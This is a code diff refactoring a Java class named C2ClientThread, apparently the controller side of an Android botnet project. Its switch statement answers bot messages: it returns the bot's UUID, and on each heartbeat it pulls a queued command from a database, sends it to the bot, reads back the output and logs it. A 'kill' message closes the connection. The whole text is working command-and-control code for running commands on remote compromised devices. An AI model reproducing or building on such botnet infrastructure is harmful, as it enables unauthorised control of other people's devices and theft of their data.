@@ -42,28 +42,29 @@ public class C2ClientThread extends Thread {
                 str = in.readLine();
                 if(str != null){
                     Log.i("received response from server", str);
-                    if(str.equals("uuid")){
-                        out.println(uuid.toString());
-                    }
+                    switch (str) {
+                        case "uuid":
+                            out.println(uuid.toString());
+                            break;
+                        case "heartbeat":
+                            //str should be heartbeat
+                            //if it is, fetch command from database
+                            ArrayList<String> cmds = commandDatabase.getFromDatabase(uuid.toString(), BotEntryContract.BotEntry.command);
+                            String command = cmds.get(0);
+                            //if there is a command, send command and readLine for output
+                            if (!command.equals("")) {
+                                out.println(command);
+                                String output = in.readLine();
+                                commandDatabase.updateDatabase(uuid.toString(), command, output);
 
-                    if(str.equals("heartbeat")){
-                        //str should be heartbeat
-                        //if it is, fetch command from database
-                        ArrayList<String> cmds = commandDatabase.getFromDatabase(uuid.toString(), BotEntryContract.BotEntry.command);
-
-                        //if there is a command, send command and readLine for output
-                        if (!cmds.get(0).equals("")){
-                            out.println(cmds.get(0));
-                            String output = in.readLine();
-                            commandDatabase.updateDatabase(uuid.toString(), "", output);
-
-                            //if there is no command, send "none"
-                        } else {
-                            out.println("None");
-                        }
-                    }
-                    else if (str.equals("kill")) {
-                        this.close();
+                                //if there is no command, send "none"
+                            } else {
+                                out.println("None");
+                            }
+                            break;
+                        case "kill":
+                            this.close();
+                            break;
                     }
                 }
             } catch (IOException e) {
